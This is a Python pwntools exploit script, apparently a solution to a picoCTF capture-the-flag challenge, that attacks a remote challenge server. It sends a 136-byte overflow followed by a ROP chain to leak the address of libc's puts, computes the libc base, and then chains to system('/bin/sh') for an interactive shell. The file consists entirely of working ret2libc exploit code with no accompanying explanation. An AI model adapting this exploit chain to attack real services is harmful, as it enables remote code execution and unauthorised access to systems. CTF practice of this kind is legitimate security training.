```python
from pwn import *
import binascii

#elf = context.binary = ELF('./vuln')
#p = process('./vuln')
p = remote('mercury.picoctf.net', 62289)
libc = ELF('libc.so.6')
context.terminal = ['tmux', 'splitw', '-h']

def debug(bps):
    gdbscript = ''

    for bp in bps:
        gdbscript += 'b *0x{:x}'.format(bp)

    gdb.attach(p, gdbscript=gdbscript)


if args.GDB:
    debug([0x400770]) # ret in do_stuff


# leak libc runtime address
pop_rdi = 0x400913
puts_at_got = 0x601018
puts_at_plt = 0x400540
main = 0x400771

payload = [
        pop_rdi, 
        puts_at_got,
        puts_at_plt,
        main
        ]

payload = b''.join([p64(rop) for rop in payload])
payload = b'A'*136 + payload

p.sendline(payload)
p.recvuntil(b"AAAd\n")

leak = u64(p.recvuntil(b'WeLcOmE')[:-7].strip().ljust(8, b'\x00'))
log.info(f"leak address => {hex(leak)}")

# --- spawn shell --- 
libc.address = leak - libc.symbols[b'puts']
bin_sh = next(libc.search(b'/bin/sh'))
system = libc.symbols[b'system']
padding = 0x40052e

log.info(f"new libc address => {hex(libc.address)}")
log.info(f"/bin/sh string => {hex(bin_sh)}")
log.info(f"system() address => {hex(system)}")

payload = [
        pop_rdi, 
        bin_sh, 
        padding, system
        ]

payload = b''.join([p64(rop) for rop in payload])
payload = b'A'*136 + payload

p.sendline(payload)
p.interactive()
```